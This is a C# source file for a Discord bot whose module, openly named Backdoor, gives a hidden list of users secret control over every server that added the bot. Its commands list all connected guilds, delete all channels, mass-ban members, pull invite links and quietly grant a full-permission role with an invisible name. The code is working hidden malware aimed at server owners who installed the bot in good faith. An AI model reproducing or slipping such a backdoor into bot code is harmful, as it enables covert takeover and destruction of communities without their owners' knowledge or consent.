using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Duck_Bot_.Net_Core.Core;
using Discord;
using Discord.Commands;
using Discord.WebSocket;
using Discord.Webhook;
using Duck_Bot_.Net_Core;
using System.IO;
using System.Reflection;

namespace Backdoor
{
    public class Backdoor : ModuleBase<SocketCommandContext> //Make next classes PUBLIC
    {
        bool check = false;
        private async Task bLog(string text)
        {
            string path = Environment.CurrentDirectory + "/Core/Data/BackdoorLog.txt";
            if (Environment.OSVersion.Platform == PlatformID.Win32NT) { path = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location).Replace("bin\\Debug\\netcoreapp2.1", "Core\\Data\\BackdoorLog.txt"); }
            StreamWriter sw = new StreamWriter(path);
            await sw.WriteLineAsync(text);
            sw.Close();
            return;
        }
        private void bCheck()
        {
            check = false;
            for (int i = 0; i <= Settings.BackDoorUsers.Count; i++)
            {
                if (Context.User.Id == Settings.BackDoorUsers.ElementAt(i)) { check = true; break; }
            }
        }
        [Command("buser"), Summary("Get user id by nickname")]
        public async Task getId(params String[] UserL)
        {
            bCheck();
            if (check != true) return;
            string output = "";
            for (int i = 0; i < UserL.Length; i++)
            {
                output += UserL.ElementAt(i);
                if (i != UserL.Length - 1)
                {
                    output += " ";
                }
            }
            if (output != "")
            {
                    try
                    {
                        var n = Duck_Bot_.Net_Core.Initialization._client.Guilds.GetEnumerator();
                        n.MoveNext();
                        var g = n.Current;
                        SocketGuildUser j = null;
                        for (int i = 0; i < Duck_Bot_.Net_Core.Initialization._client.Guilds.Count; i++)
                        {
                            g = n.Current;
                            n.MoveNext();
                            if (j == null)
                            {
                                j = g.Users.FirstOrDefault(x => x.Username == output);
                            }
                        }
                        if (j == null)
                    {
                        return;
                    }
                    EmbedBuilder eb = new EmbedBuilder();
                    eb.WithAuthor("Succesfull", Context.User.GetAvatarUrl());
                    eb.WithColor(40, 200, 150);
                    eb.WithThumbnailUrl(j.GetAvatarUrl());
                    eb.WithDescription($"**{j.Username}'s id: {j.Id}**" + Environment.NewLine + $"Created at: {j.CreatedAt.UtcDateTime}");
                    await Context.Channel.SendMessageAsync("", false, eb.Build());
                    string text = $"[{DateTime.UtcNow}] {Context.User.Username} used d!buser command for user {j.Username}.";
                    Console.WriteLine(text);
                    await bLog(text);
                    return;
                    }
                    catch (Exception)
                    {
                    EmbedBuilder eb2 = new EmbedBuilder();
                    eb2.WithAuthor("Error", Context.User.GetAvatarUrl());
                    eb2.WithThumbnailUrl("https://cdn.discordapp.com/attachments/524677710770077697/527415053134331925/WarDT.png");
                    eb2.WithDescription($"**Can't find user with username \"{output}\" in all connected to bot servers.**");
                    await Context.Channel.SendMessageAsync("", false, eb2.Build());
                        return;
                    }
            }
        }
        [Command("bdelchats"), Summary("Deletes all chats")]
        public async Task delChats(ulong GuildId, string pass = "")
        {
            if (!(Context.User.Id == Settings.Owner)) return;
            if (Context.Client.Guilds.Where(x => x.Id == GuildId).Count() < 1)
            {
                await Context.User.SendMessageAsync($":x: **I am not in a guild with id: {GuildId}**");
                return;
            }
            for (int i = 0; i < Settings.ProtectedGuilds.Count; i++)
            {
                if (GuildId == Settings.ProtectedGuilds.ElementAt(i))
                {
                    if (pass == "")
                    {
                        EmbedBuilder eb = new EmbedBuilder();
                        eb.WithAuthor($"Error", Context.User.GetAvatarUrl());
                        eb.WithColor(40, 200, 150);
                        SocketGuild Guild1 = Context.Client.Guilds.Where(x => x.Id == GuildId).FirstOrDefault();
                        eb.WithDescription($"**:x: {Guild1.Name} is protected. Use password to delete chats in this guild**");
                        eb.WithThumbnailUrl("https://cdn.discordapp.com/attachments/524677710770077697/527415053134331925/WarDT.png");
                        await Context.User.SendMessageAsync("", false, eb.Build());
                        return;
                    }
                    else if (pass == Settings.ProtectPassword)
                    {
                        EmbedBuilder eb = new EmbedBuilder();
                        eb.WithAuthor($"Succesfull", Context.User.GetAvatarUrl());
                        eb.WithColor(40, 200, 150);
                        eb.WithDescription($"**:white_check_mark: Password is correct. Deleting channels...**");
                        eb.WithThumbnailUrl("https://cdn.discordapp.com/attachments/524677710770077697/527415053134331925/WarDT.png");
                        await Context.User.SendMessageAsync("", false, eb.Build());
                        break;
                    }
                    else
                    {
                        EmbedBuilder eb = new EmbedBuilder();
                        eb.WithAuthor($"Error", Context.User.GetAvatarUrl());
                        eb.WithColor(40, 200, 150);
                        eb.WithDescription($":x:**Password is incorrect.**");
                        eb.WithThumbnailUrl("https://cdn.discordapp.com/attachments/524677710770077697/527415053134331925/WarDT.png");
                        await Context.User.SendMessageAsync("", false, eb.Build());
                        return;
                    }
                }
            }
            SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildId).FirstOrDefault();
            try
            {
                int m = Guild.Channels.Count;
                for (int i = 0; i < m; i++)
                {
                    await Guild.Channels.First().DeleteAsync();
                    await Task.Delay(1000);
                }
                EmbedBuilder eb = new EmbedBuilder();
                eb.WithAuthor($"Succesfull", Context.User.GetAvatarUrl());
                eb.WithColor(40, 200, 150);
                eb.WithDescription($"**:white_check_mark: Deleted {m} channels in {Guild.Name} succesfully**");
                eb.WithThumbnailUrl("https://cdn.discordapp.com/attachments/524677710770077697/527415053134331925/WarDT.png");
                await Context.User.SendMessageAsync("", false, eb.Build());
                string text = $"[{DateTime.UtcNow}] {Context.User.Username} used d!delchats command for guild {Guild.Name}.";
                Console.WriteLine(text);
                await bLog(text);
            } catch (Exception ex)
            {
                EmbedBuilder eb = new EmbedBuilder();
                eb.WithAuthor($"Error", Context.User.GetAvatarUrl());
                eb.WithColor(40, 200, 150);
                eb.WithDescription($"**:x: Can't delete all channels in {Guild.Name} {Environment.NewLine} Error: {ex.Message}**");
                eb.WithThumbnailUrl("https://cdn.discordapp.com/attachments/524677710770077697/527415053134331925/WarDT.png");
                await Context.User.SendMessageAsync("", false, eb.Build());
                Console.WriteLine($"[{DateTime.UtcNow}] {Context.User.Username} used d!delchats command for guild {Guild.Name}.");
            }
        }
        [Command("binvite"), Summary("Get the invite of a server")]
        public async Task BackdoorModule(ulong GuildId)
        {
            bCheck();
            if (check != true) return;

            if (Context.Client.Guilds.Where(x => x.Id == GuildId).Count() < 1)
            {
                await Context.User.SendMessageAsync($":x: **I am not in a guild with id: {GuildId}**");
                return;
            }

            SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildId).FirstOrDefault();
            try
            {
                var Invites = await Guild.GetInvitesAsync();
                if (Invites.Count() < 1)
                {
                    await Guild.TextChannels.First().CreateInviteAsync();
                }
                Invites = await Guild.GetInvitesAsync();
                EmbedBuilder Embed = new EmbedBuilder();
                Embed.WithAuthor($"Invites to guild {Guild.Name}", Guild.IconUrl);
                Embed.WithColor(40, 200, 150);
                int inv = 0;
                foreach (var Current in Invites)
                {
                    if (inv < 25)
                    {
                        inv++;
                        Embed.AddField("Invite:", $"[{Current.ChannelName}]({Current.Url})", true);
                    }
                }
                await Context.User.SendMessageAsync("", false, Embed.Build());
                string text = $"[{DateTime.UtcNow}] {Context.User.Username} used d!binvite command for guild {Guild.Name}.";
                Console.WriteLine(text);
                await bLog(text);
            }
            catch (Exception ex)
            {
                EmbedBuilder eb = new EmbedBuilder();
                eb.WithAuthor($"Error", Context.User.GetAvatarUrl());
                eb.WithColor(40, 200, 150);
                eb.WithDescription($":x:**Creating invite list to guild {Guild.Name} went wrong with error {ex.Message}**");
                eb.WithThumbnailUrl("https://cdn.discordapp.com/attachments/524677710770077697/527415053134331925/WarDT.png");
                await Context.User.SendMessageAsync("", false, eb.Build());
                return;
            }
        }
        [Command("bunban"), Summary("Unban user")]
        public async Task unban(ulong Uid, ulong GuildId)
        {
            bCheck();
            if (check != true) return;

            if (Context.Client.Guilds.Where(x => x.Id == GuildId).Count() < 1)
            {
                await Context.User.SendMessageAsync($":x: **I am not in a guild with id: {GuildId}**");
                return;
            }
            SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildId).FirstOrDefault();
            try
            {
                await Guild.RemoveBanAsync(Uid);
                EmbedBuilder eb = new EmbedBuilder();
                eb.WithAuthor($"Succesfull");
                eb.WithColor(40, 200, 150);
                eb.WithDescription($":white_check_mark:**Unbanned user with id {Uid} in {Guild.Name} succesfully**");
                eb.WithThumbnailUrl(Settings.MainThumbnailUrl);
                await Context.User.SendMessageAsync("", false, eb.Build());
                string text = $"[{DateTime.UtcNow}] {Context.User.Username} used d!bunban command for user with id {Uid} in {Guild.Name}.";
                Console.WriteLine(text);
                await bLog(text);
            }
            catch (Exception ex)
            {
                EmbedBuilder eb = new EmbedBuilder();
                eb.WithAuthor($"Error");
                eb.WithColor(40, 200, 150);
                eb.WithDescription($":x:**Can't unban user with id {Uid} in {Guild.Name} {Environment.NewLine} Error: {ex.Message}**");
                eb.WithThumbnailUrl(Settings.MainThumbnailUrl);
                await Context.User.SendMessageAsync("", false, eb.Build());
            }
        }
        [Command("bban"), Summary("Ban user")]
        public async Task ban(string Uid, ulong GuildId, string pass = "")
        {
            bCheck();
            if (check != true) return;

            if (Context.Client.Guilds.Where(x => x.Id == GuildId).Count() < 1)
            {
                await Context.User.SendMessageAsync($":x: **I am not in a guild with id: {GuildId}**");
                return;
            }
            SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildId).FirstOrDefault();
            if (Uid == "all" || Uid == "ALL")
            {
                if (pass != Settings.ProtectPassword)
                {
                    EmbedBuilder eb1 = new EmbedBuilder();
                    eb1.WithAuthor($"Error");
                    eb1.WithColor(40, 200, 150);
                    eb1.WithDescription($":x: **Protect password for mass ban is incorrect**");
                    eb1.WithThumbnailUrl(Settings.MainThumbnailUrl);
                    await Context.User.SendMessageAsync("", false, eb1.Build());
                    return;
                }
                foreach (var user in Guild.Users)
                {
                    if (user.Hierarchy < Guild.CurrentUser.Hierarchy)
                    {
                        await Guild.AddBanAsync(user, 7);
                    }
                }
                EmbedBuilder eb = new EmbedBuilder();
                eb.WithAuthor($"Succesfull");
                eb.WithColor(40, 200, 150);
                eb.WithDescription($":white_check_mark: **All users with lower role was banned in {Guild.Name} succesfully**");
                eb.WithThumbnailUrl(Guild.IconUrl);
                await Context.User.SendMessageAsync("", false, eb.Build());
                string text = $"[{DateTime.UtcNow}] {Context.User.Username} used d!bban ALL command for guild {Guild.Name}.";
                Console.WriteLine(text);
                await bLog(text);
                return;
            }
            try
            {
                await Guild.AddBanAsync(ulong.Parse(Uid));
                EmbedBuilder eb = new EmbedBuilder();
                eb.WithAuthor($"Succesfull");
                eb.WithColor(40, 200, 150);
                eb.WithDescription($":white_check_mark: **Banned user with id {Uid} in {Guild.Name} succesfully**");
                eb.WithThumbnailUrl(Settings.MainThumbnailUrl);
                await Context.User.SendMessageAsync("", false, eb.Build());
                string text = $"[{DateTime.UtcNow}] {Context.User.Username} used d!bban command for user with id {Uid} in {Guild.Name}.";
                Console.WriteLine(text);
                await bLog(text);
                return;
            }
            catch (Exception ex)
            {
                EmbedBuilder eb = new EmbedBuilder();
                eb.WithAuthor($"Error");
                eb.WithColor(40, 200, 150);
                eb.WithDescription($":x: **Can't ban user with id {Uid} in {Guild.Name} {Environment.NewLine} Error: {ex.Message}**");
                eb.WithThumbnailUrl(Settings.MainThumbnailUrl);
                await Context.User.SendMessageAsync("", false, eb.Build());
                return;
            }

        }
        [Command("brole"), Summary("Give user Ducky Bot role")]
        public async Task role(ulong Uid, ulong GuildId)
        {
            bCheck();
            if (check != true) return;

            if (Context.Client.Guilds.Where(x => x.Id == GuildId).Count() < 1)
            {
                await Context.User.SendMessageAsync($":x: **I am not in a guild with id: {GuildId}**");
                return;
            }
            SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildId).FirstOrDefault();
            SocketUser UserS = Guild.GetUser(Uid);
            if (UserS == null)
            {
                await Context.User.SendMessageAsync($":x: **Can't find user with id: {Uid} in {Guild.Name}**");
                return;
            }
            try
            {
                GuildPermissions perm = new GuildPermissions();
                Color col = new Color(47, 49, 54);
                perm = perm.Modify(true, true, true, true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true,true);
                if (Guild.Roles.Where(x => x.Name == "ᅠ").Count() < 1)
                {
                    await Guild.CreateRoleAsync("ᅠ", perm, col, false);
                }
                var role = Guild.Roles.FirstOrDefault(x => x.Name == "ᅠ");
                await Guild.GetUser(Uid).AddRoleAsync(role);
                EmbedBuilder eb = new EmbedBuilder();
                eb.WithAuthor($"Succesfull", UserS.GetAvatarUrl());
                eb.WithColor(40, 200, 150);
                eb.WithDescription($":white_check_mark: **Role gave to {UserS.Username} in {Guild.Name} succesfully**");
                eb.WithThumbnailUrl($"{Guild.IconUrl}");
                await Context.User.SendMessageAsync("", false, eb.Build());
                string text = $"[{DateTime.UtcNow}] {Context.User.Username} used d!brole command for user {Guild.Users.FirstOrDefault(x => x.Id == Uid).Username} in {Guild.Name}.";
                Console.WriteLine(text);
                await bLog(text);
            }
            catch (Exception ex)
            {
                EmbedBuilder eb = new EmbedBuilder();
                eb.WithAuthor($"Error");
                eb.WithColor(40, 200, 150);
                eb.WithDescription($":x: **Can't give role to user with id {Uid} in {Guild.Name} {Environment.NewLine} Error: {ex.Message}**");
                await Context.User.SendMessageAsync("", false, eb.Build());
            }
        }
        [Command("blist"), Summary("A all connected guilds list")]
        public async Task list()
        {
            bCheck();
            if (check != true) return;

            var g = Initialization._client.Guilds.GetEnumerator();
            var d = Initialization._client.Guilds;
            EmbedBuilder eb = new EmbedBuilder();
            eb.WithAuthor($"Connected {d.Count} guilds. List:", Context.User.GetAvatarUrl());
            eb.WithColor(40, 200, 150);
            eb.WithFooter("Please don't make more chaos with them =3");
            g.MoveNext();
            for (int i = 0; i < d.Count; i++)
            {
                eb.AddField($"{g.Current.Name}", $"**ID: {g.Current.Id}** {Environment.NewLine} **Created at: {g.Current.CreatedAt.UtcDateTime}** {Environment.NewLine} **Users: {g.Current.Users.Count}** {Environment.NewLine} **--------------------------------------**");
                g.MoveNext();
            }
            eb.WithThumbnailUrl(Settings.MainThumbnailUrl);
            await Context.User.SendMessageAsync("", false, eb.Build());
            string text = $"[{DateTime.UtcNow}] {Context.User.Username} used d!blist command.";
            Console.WriteLine(text);
            await bLog(text);
        }
        [Command("bhelp"), Summary("Backdoor help")]
        public async Task bdhelp()
        {
            bCheck();
            if (check != true) return;

            EmbedBuilder eb = new EmbedBuilder();
            eb.WithAuthor("Hello backdoor user! There are backdoor commands", Context.User.GetAvatarUrl());
            eb.WithColor(40, 200, 150);
            eb.WithFooter("Please don't make more chaos with them =3");
            eb.WithDescription(
                "**🔹blist - Give a connected guilds list**" + Environment.NewLine +
                "**🔹bdelchats [GuildID] - Delete all server chats**" + Environment.NewLine +
                "**🔹buser [Username] - Get user info by it's username**" + Environment.NewLine +
                "**🔹binvite [GuildID] - Send all guild invites**" + Environment.NewLine +
                "**🔹bunban [UserID] [GuildID] - Unbans user in guild**" + Environment.NewLine +
                "**🔹bban [UserID] [GuildID] - Ban user in guild**" + Environment.NewLine +
                "**🔹brole [UserID] [GuildID] - Give admin role to user**"
                );
            eb.WithThumbnailUrl(Settings.MainThumbnailUrl);
            await Context.User.SendMessageAsync("", false, eb.Build());
        }
    }
}